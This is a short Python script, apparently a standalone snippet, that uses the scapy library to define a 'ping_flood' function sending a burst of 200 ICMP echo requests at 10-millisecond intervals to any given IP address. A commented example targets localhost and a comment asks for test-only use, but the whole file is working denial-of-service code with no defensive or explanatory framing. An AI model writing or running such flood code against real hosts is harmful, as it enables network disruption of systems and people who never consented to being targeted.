from scapy.all import IP, ICMP, send

def ping_flood(target_ip):
    """
    Sends a burst of ICMP Echo Request packets (ping flood) to the target IP address.
    
    Parameters:
    - target_ip (str): The IP address to flood with ICMP packets.
    """
    packet = IP(dst=target_ip) / ICMP()
    send(packet, count=200, inter=0.01, verbose=0)

# Example usage (use only in a safe/test environment):
# ping_flood("127.0.0.1")
